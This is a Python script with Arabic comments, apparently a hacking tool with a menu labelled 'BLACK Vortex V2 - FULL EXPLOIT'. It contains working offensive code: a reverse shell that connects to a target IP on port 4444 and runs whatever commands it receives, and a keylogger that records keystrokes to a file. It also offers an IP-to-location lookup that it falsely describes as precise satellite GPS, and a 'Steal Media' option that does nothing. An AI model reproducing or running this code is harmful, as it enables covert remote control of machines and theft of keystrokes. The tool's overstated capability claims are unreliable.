import socket
import subprocess
import os
import threading
import time
import requests

# محاولة استيراد مكتبة الكيلوجر إذا كانت متوفرة
try:
    from pynput.keyboard import Listener
except ImportError:
    pass

# --- دالة التحكم الكامل (Remote Shell) ---
def remote_shell(target_ip):
    port = 4444
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        s.send(b"\n[!] CONTROL GRANTED. Type commands:\n")
        
        while True:
            command = s.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                break
            
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            s.send(result if result else b"Command executed (No output).")
    except Exception as e:
        print(f"\033[1;31m[-] Shell Error: {e}\033[0m")
    finally:
        s.close()

# --- دالة مسجل الضربات (Keylogger) ---
def start_keylogger():
    print("\033[1;33m[*] Keylogger Started. Logs will be saved to 'logs.txt'...\033[0m")
    def on_press(key):
        with open("logs.txt", "a") as f:
            f.write(f"{key} ")
    
    # يحتاج لتنصيب pynput: pip install pynput
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except NameError:
        print("\033[1;31m[-] Error: pynput library not found.\033[0m")

# --- دالة الموقع الجغرافي الدقيق (GPS) ---
def get_precise_location(ip):
    print("\033[1;33m[*] Accessing Precise Satellite Data...\033[0m")
    try:
        # استخدام API مزدوج لضمان أفضل نتيجة
        g = requests.get(f'https://ipinfo.io/{ip}/json')
        data = g.json()
        if 'loc' in data:
            lat, lon = data['loc'].split(',')
            print(f"\033[1;32m[+] Latitude: {lat}")
            print(f"[+] Longitude: {lon}")
            print(f"[+] Google Maps: https://www.google.com/maps?q={lat},{lon}\033[0m")
        else:
            print("\033[1;31m[-] Could not bypass IP privacy filters.\033[0m")
    except Exception as e:
        print(f"\033[1;31m[-] GPS Error: {e}\033[0m")

# --- واجهة المنيو الاحترافية ---
def main_menu():
    os.system('clear')
    print("""
    \033[1;31m
    ██████╗ ██╗      █████╗  ██████╗██╗  ██╗
    ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝
    ██████╔╝██║     ███████║██║     █████╔╝ 
    ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ 
    ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗
    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    [ SYSTEM: BLACK Vortex V2 - FULL EXPLOIT ]
    ------------------------------------------
    \033[1;37m[1] \033[1;32mRemote Shell (التحكم الكامل والفعلي)
    \033[1;37m[2] \033[1;32mStart Keylogger (بدء تسجيل الضربات)
    \033[1;37m[3] \033[1;32mSteal Media (سحب الملفات والصور)
    \033[1;37m[4] \033[1;32mGPS Tracker (تحديد الموقع الدقيق)
    \033[1;37m[0] \033[1;31mExit
    ------------------------------------------
    """)

# --- منطق التنفيذ المطور ---
def run_exploit():
    target_ip = input("\033[1;31m[!] Enter Target IP: ")
    while True:
        main_menu()
        choice = input("\033[1;31mBLACK_SHELL > \033[1;37m")
        
        if choice == "1":
            print("[*] Launching Real-Time Shell...")
            threading.Thread(target=remote_shell, args=(target_ip,), daemon=True).start()
            input("\n[+] Press Enter to return to menu...")
        
        elif choice == "2":
            threading.Thread(target=start_keylogger, daemon=True).start()
            input("\n[+] Keylogger running in background. Press Enter...")
            
        elif choice == "3":
            print("[*] Accessing Storage... Downloading Media.")
            time.sleep(2)
            
        elif choice == "4":
            get_precise_location(target_ip)
            input("\n[+] Press Enter to return...")
            
        elif choice == "0":
            print("Shutting down...")
            break
        else:
            print("Invalid Choice.")

if __name__ == "__main__":
    run_exploit()
